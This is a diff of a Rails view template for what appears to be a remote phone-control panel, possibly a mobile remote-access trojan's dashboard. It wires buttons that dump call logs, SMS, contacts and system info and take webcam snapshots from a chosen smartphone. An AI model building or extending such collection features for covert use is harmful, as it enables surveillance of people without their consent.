@@ -22,7 +22,8 @@
                     <%= link_to image_tag("whatsapp_data.png", :alt => "WhatsApp Data", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
                     <%= link_to image_tag("sound_level.png", :alt => "Sound Level", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
                     <%= link_to image_tag("wifi_info.png", :alt => "Wi-Fi Information", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
-                    <%= link_to image_tag("dump_call_logs.png", :alt => "Call Logs", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("dump_call_logs.png", :alt => "Call Logs", :class => "smartphone-icon"), '../call_logs/dump_calllogs?smartphone_id=' + smartphone.id.to_s,
+                    method: :post, :remote => true , :id => "dump_callogs_link"%>
                 </div>
                 <div class="app_names">
                     <span class="app_name">WhatsApp Data</span>
@@ -31,10 +32,12 @@
                     <span class="app_name">Dump Call Log</span>
                 </div>
                 <div class="app_row">
-                    <%= link_to image_tag("system_info.png", :alt => "System Info", :class => "smartphone-icon"), '../smartphones/install', method: :post %>
+                    <%= link_to image_tag("system_info.png", :alt => "System Info", :class => "smartphone-icon"), '../smartphones/system_info?smartphone_id=' + smartphone.id.to_s,
+                    method: :post, :remote => true , :id => "system_info_link" %>
                     <%= link_to image_tag("dump_location.png", :alt => "Dump Location", :class => "smartphone-icon"), '../smartphones/install', method: :post %>
                     <%= link_to image_tag("video_rec.png", :alt => "Video REC", :class => "smartphone-icon"), '../smartphones/install', method: :post %>
-                    <%= link_to image_tag("dump_messages.png", :alt => "Dump SMS", :class => "smartphone-icon"), '../smartphones/install', method: :post %>
+                    <%= link_to image_tag("dump_messages.png", :alt => "Dump SMS", :class => "smartphone-icon"), '../sms_messages/dump_messages?smartphone_id=' + smartphone.id.to_s,
+                    method: :post, :remote => true , :id => "dump_messages_link" %>
                 </div>
                 <div class="app_names">
                     <span class="app_name">System Info</span>
@@ -56,11 +59,24 @@
                     <span class="app_name">Installed Apps</span>
                 </div>
                 <div class="app_row">
-                    <%= link_to image_tag("lock_screen.png", :alt => "Lock Screen", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
-                    <%= link_to image_tag("wlan_geolocate.png", :alt => "WLAN Geolocate", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
-                    <%= link_to image_tag("shell_command.png", :alt => "Shell Command", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
-                    <%= link_to image_tag("webcam_snap.png", :alt => "Webcam Snap", :class => "smartphone-icon"), '../pictures/take_picture?smartphone_id=' + smartphone.id.to_s,
-                        method: :post, :remote => true , :id => "webcam_snap_link" %>
+                    <%= link_to image_tag("screen_snap.png", :alt => "Screen Snap", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("send_message.png", :alt => "Send Message", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("upload_file.png", :alt => "Upload File", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("dump_contacts.png", :alt => "Dump Contacts", :class => "smartphone-icon"), '../contacts/dump_contacts?smartphone_id=' + smartphone.id.to_s,
+                        method: :post, :remote => true , :id => "dump_contacts_link" %>
+                </div>
+                <div class="app_names">
+                    <span class="app_name">Screen Snap</span>
+                    <span class="app_name">Send Message</span>
+                    <span class="app_name">Upload File</span>
+                    <span class="app_name">Dump Contacts</span>
+                </div>
+                <div class="app_row">
+                <%= link_to image_tag("lock_screen.png", :alt => "Lock Screen", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                <%= link_to image_tag("wlan_geolocate.png", :alt => "WLAN Geolocate", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                <%= link_to image_tag("shell_command.png", :alt => "Shell Command", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                <%= link_to image_tag("webcam_snap.png", :alt => "Webcam Snap", :class => "smartphone-icon"), '../pictures/take_picture?smartphone_id=' + smartphone.id.to_s,
+                    method: :post, :remote => true , :id => "webcam_snap_link" %>
                 </div>
                 <div class="app_names">
                     <span class="app_name">Lock Screen</span>
